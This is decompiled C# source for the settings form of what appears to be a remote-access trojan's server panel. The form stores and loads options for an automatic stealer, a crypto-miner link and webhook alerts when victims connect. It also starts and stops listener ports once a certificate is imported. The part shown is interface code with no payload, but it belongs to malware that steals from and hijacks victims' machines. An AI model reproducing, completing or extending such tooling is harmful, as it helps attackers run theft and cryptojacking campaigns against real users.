using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000BC RID: 188
	public partial class FormSettings : FormMaterial
	{
		// Token: 0x06000614 RID: 1556 RVA: 0x00058487 File Offset: 0x00056687
		public FormSettings()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000615 RID: 1557 RVA: 0x00058498 File Offset: 0x00056698
		private void FormSettings_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			if (File.Exists("local\\Settings.json"))
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				this.materialSwitch1.Checked = settings.WebHookNewConnect;
				this.materialSwitch2.Checked = settings.WebHookConnect;
				this.checkBox2.Checked = settings.AutoStealer;
				this.rjTextBox2.Texts = settings.WebHook;
				this.rjTextBox1.Texts = string.Join(",", settings.Ports);
				this.rjTextBox3.Texts = settings.linkMiner;
				this.rjComboBox1.SelectedIndex = settings.Style;
				this.numericUpDown1.Value = settings.second;
			}
			if (FormSettings.listners.Count > 0)
			{
				this.rjTextBox1.Enabled = false;
				this.rjButton1.Text = "Stop";
				this.materialLabel1.Text = "Status: [Listner ports: ";
				string text = "";
				foreach (Listner listner in FormSettings.listners)
				{
					text = text + listner.port.ToString() + ",";
				}
				text = text.Remove(text.Length - 1, 1);
				Label label = this.materialLabel1;
				label.Text = label.Text + text + "]";
			}
			if (Certificate.Imported)
			{
				this.materialLabel2.Text = "Certificate: [Imported]";
			}
			base.FormClosing += new FormClosingEventHandler(this.ClosingForm);
		}

		// Token: 0x06000616 RID: 1558 RVA: 0x00058668 File Offset: 0x00056868
		private void ChangeScheme(object sender)
		{
			this.numericUpDown1.ForeColor = FormMaterial.PrimaryColor;
			this.rjComboBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BackColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000617 RID: 1559 RVA: 0x000586D8 File Offset: 0x000568D8
		private void ClosingForm(object sender, EventArgs e)
		{
			Settings settings = new Settings();
			settings.Ports = this.rjTextBox1.Texts.Split(new char[]
			{
				','
			});
			settings.Start = (this.rjButton1.Text == "Stop");
			settings.second = (int)this.numericUpDown1.Value;
			settings.WebHookNewConnect = this.materialSwitch1.Checked;
			settings.WebHookConnect = this.materialSwitch2.Checked;
			settings.AutoStealer = this.checkBox2.Checked;
			settings.WebHook = this.rjTextBox2.Texts;
			settings.linkMiner = this.rjTextBox3.Texts;
			settings.Style = this.rjComboBox1.SelectedIndex;
			Program.form.settings = settings;
			File.WriteAllText("local\\Settings.json", JsonConvert.SerializeObject(settings));
		}

		// Token: 0x06000618 RID: 1560 RVA: 0x000587C0 File Offset: 0x000569C0
		private void rjButton1_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.rjButton1.Text))
			{
				return;
			}
			if (this.materialLabel2.Text == "Certificate: [Not Exists]")
			{
				new FormCertificate().ShowDialog();
				return;
			}
			if (this.rjButton1.Text == "Start")
			{
				this.rjTextBox1.Enabled = false;
				this.rjButton1.Text = "Stop";
				this.rjTextBox1.Texts.Split(new char[]
				{
					','
				}).ToList<string>().ForEach(delegate(string item)
				{
					FormSettings.listners.Add(new Listner(Convert.ToInt32(item)));
				});
				this.materialLabel1.Text = "Status: [Listner ports: ";
				foreach (Listner listner in FormSettings.listners)
				{
					Label label = this.materialLabel1;
					label.Text = label.Text + listner.port.ToString() + ",";
				}
				this.materialLabel1.Text = this.materialLabel1.Text.Remove(this.materialLabel1.Text.Length - 1, 1) + "]";
				return;
			}
			this.rjButton1.Text = "Start";
			this.rjTextBox1.Enabled = true;
			FormSettings.listners.ForEach(delegate(Listner item)
			{
				item.Stop();
			});
			FormSettings.listners.Clear();
			this.materialLabel1.Text = "Status: [offline]";
		}

		// Token: 0x06000619 RID: 1561 RVA: 0x0005898C File Offset: 0x00056B8C
		private void rjComboBox1_OnSelectedIndexChanged(object sender, EventArgs e)
		{
			MaterialSkinManager instance = MaterialSkinManager.Instance;
			FormMaterial.GetColorScheme(this.rjComboBox1.SelectedIndex, instance);
			instance.Theme = MaterialSkinManager.Themes.LIGHT;
			this.Refresh();
		}

		// Token: 0x040004DD RID: 1245
		public static List<Listner> listners = new List<Listner>();
	}
}
